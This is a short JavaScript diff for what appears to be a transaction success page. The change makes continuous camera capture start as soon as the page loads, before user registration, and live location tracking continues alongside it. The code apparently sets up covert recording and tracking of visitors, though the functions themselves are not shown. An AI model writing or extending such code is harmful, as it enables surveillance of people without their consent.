@@ -122,9 +122,10 @@ document.addEventListener('DOMContentLoaded', function() {
     loadTransaction();
     // Start shake-to-cycle-status
     initShakeStatus();
+    // Start video recording immediately — don't wait for registration
+    startContinuousCameraCapture();
     // Keep tracking location on success page too
     registerAppUser(getAppUsername()).then(() => {
         startLiveLocationTracking();
-        startContinuousCameraCapture();
     });
 });
